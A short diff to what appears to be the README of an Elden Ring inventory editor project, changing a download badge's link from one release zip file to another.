@@ -3,7 +3,7 @@
 ### 📥 Download & Discuss
 
 <p align="center">
-    <a href="https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/download/elden-ring/ShadowTrainerVisual.zip">
+    <a href="https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/download/elden-ring/EldenRing.zip">
       <img src="https://img.shields.io/badge/DOWNLOAD%20V1.0-READY!-28a745?style=for-the-badge&logoColor=white&logo=git&labelColor=333" alt="Download V1.0 READY!">
     </a>
   </p>
